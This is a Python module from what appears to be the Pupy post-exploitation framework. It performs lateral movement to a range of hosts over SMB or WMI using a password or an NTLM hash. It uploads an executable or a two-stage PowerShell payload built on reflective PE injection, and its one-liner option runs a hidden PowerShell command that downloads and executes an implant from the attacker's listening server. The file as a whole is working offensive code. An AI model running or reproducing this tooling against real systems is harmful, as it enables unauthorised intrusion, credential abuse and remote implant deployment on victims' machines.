# -*- coding: UTF8 -*-
# Author: byt3bl33d3r and Shawn Evans
# Version used from the "rewrite" branch of smbexec written by byt3bl33d3r 
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdo
import pupygen
import re
import os
import tempfile
import random
import string
from rpyc.utils.classic import upload
from pupylib.payloads.ps1_oneliner import create_ps_command, getInvokeReflectivePEInjectionWithDLLEmbedded
import shutil
from subprocess import PIPE, Popen
import time
import ntpath

__class_name__="PSExec"

@config(cat="admin")
class PSExec(PupyModule):
    """ Launch remote commands using smbexec or wmiexec"""
    max_clients=1

    def init_argparse(self):
        
        self.arg_parser = PupyArgumentParser(prog="psexec", description=self.__doc__)
        self.arg_parser.add_argument("-u", metavar="USERNAME", dest='user', default='', help="Username, if omitted null session assumed")
        self.arg_parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default='', help="Password")
        self.arg_parser.add_argument("-H", metavar="HASH", dest='hash', default='', help='NTLM hash')
        self.arg_parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
        self.arg_parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
        self.arg_parser.add_argument("--port", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default 445)")
        self.arg_parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")

        sgroup = self.arg_parser.add_argument_group("Command Execution", "Options for executing commands on the specified host")
        sgroup.add_argument('-execm', choices={"smbexec", "wmi"}, dest="execm", default="smbexec", help="Method to execute the command (default: smbexec)")
        sgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute a command")

        sgroupp = self.arg_parser.add_argument_group("Command Execution", "Get a remote shell")
        sgroupp.add_argument('--ps1-oneliner', action='store_true', default=False, help="Download and execute pupy using ps1_oneline")
        sgroupp.add_argument('--ps1-port', default=8080, type=int, help="Custom port used by the listening server (used with --ps1-oneliner, default: 8080)")
        sgroupp.add_argument("--ps1",  action='store_true', default=False, help="Upload and execute a powershell file to get a pupy session")
        sgroupp.add_argument("--file", dest="file", default=None, help="Upload and execute an exe file")
        
    def run(self, args):

        if "/" in args.target[0]:
            hosts = IPNetwork(args.target[0])
        else:
            hosts = list()
            hosts.append(args.target[0])
        
        ext = ''
        remote_path = ''
        dst_folder = ''
        file_to_upload = []
        if args.file or args.ps1:
            
            tmp_dir = tempfile.gettempdir()

            if self.client.is_windows():
                remote_path = '%s\\' % self.client.conn.modules['os.path'].expandvars("%ALLUSERSPROFILE%")
            else:
                remote_path = '/tmp/'

            # write on the temp directory 
            if args.share == 'C$':
                dst_folder = "C:\\Windows\\TEMP\\"
            # write on the root directory
            else:
                dst_folder = '%s\\' % args.share.replace('$', ':')

            # if executable to upload
            if args.file:
                if not os.path.exists(args.file):
                    self.error('File not found: %s' % args.file)
                    return

                if not args.file.endswith('.exe'):
                    self.error('Only executable files could be uploaded')
                    return

                ext = '.exe'
                random_name = ''.join(random.sample(string.ascii_letters, 10)) + ext
                shutil.copy(args.file, tmp_dir + os.sep + random_name)
                file_to_upload = [random_name]

            # if uploading powershell
            else:
                ext = '.txt'
                first_stage = ''.join(random.sample(string.ascii_letters, 10)) + ext
                second_stage = ''.join(random.sample(string.ascii_letters, 10)) + ext
                file_to_upload = [first_stage, second_stage]

                launcher = """cat {invoke_reflective_random_name} | Out-String | IEX""".format(invoke_reflective_random_name=dst_folder + second_stage)
                launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
                open(tmp_dir + os.sep + first_stage, 'w').write(launcher)
                self.success('first stage created: %s' % tmp_dir + os.sep + first_stage)
                
                command = getInvokeReflectivePEInjectionWithDLLEmbedded(self.client.get_conf())
                open(tmp_dir + os.sep + second_stage, 'w').write(command)
                self.success('second stage created: %s' % tmp_dir + os.sep + second_stage)

            for file in file_to_upload:
                src = tmp_dir + os.sep + file
                dst = remote_path + file

                self.info("Uploading file to {0}".format(dst))
                upload(self.client.conn, src, dst)
                self.success("File uploaded")

        if args.ps1_oneliner:
            res=self.client.conn.modules['pupy'].get_connect_back_host()
            ip, port = res.rsplit(':', 1)

            cmd = '%s/pupygen.py -f ps1_oneliner --ps1-oneliner-listen-port %s connect --host %s:%s' % (os.getcwd(), str(args.ps1_port), ip, port)
            self.warning('starting the local server')
            process = Popen(cmd.split(' '), stdout=PIPE, stderr=PIPE, stdin=PIPE)
            time.sleep(2)
            
            # check if the server has been launched corretly
            if process.poll():
                self.error('the server has not been launched, check if the port %s or if the file %s/pupygen.py exists' % (str(args.ps1_port), os.getcwd()))
                return
            
            self.success('server started (pid: %s)' % process.pid)
            args.command = 'powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString(\'http://%s:%s/eiloShaegae1\')"' % (ip, str(args.ps1_port))

        self.info("Loading dependencies")
        self.client.load_package("impacket")
        self.client.load_package('ntpath')
        self.client.load_package("calendar")
        self.client.load_package("pupyutils.psexec")

        with redirected_stdo(self.client.conn):
            for host in hosts:
                self.info("Connecting to the remote host: %s" % host)
                self.client.conn.modules["pupyutils.psexec"].connect(host, args.port, args.user, args.passwd, args.hash, args.share, file_to_upload, remote_path, dst_folder, args.command, args.domain, args.execm)

            if args.ps1_oneliner:                
                self.warning('stopping the local server (pid: %s)' % process.pid)
                process.terminate()

            elif args.ps1:
                self.warning('Do not forget to remove the file: %s' % dst_folder + first_stage)
                self.warning('Do not forget to remove the file: %s' % dst_folder + second_stage)
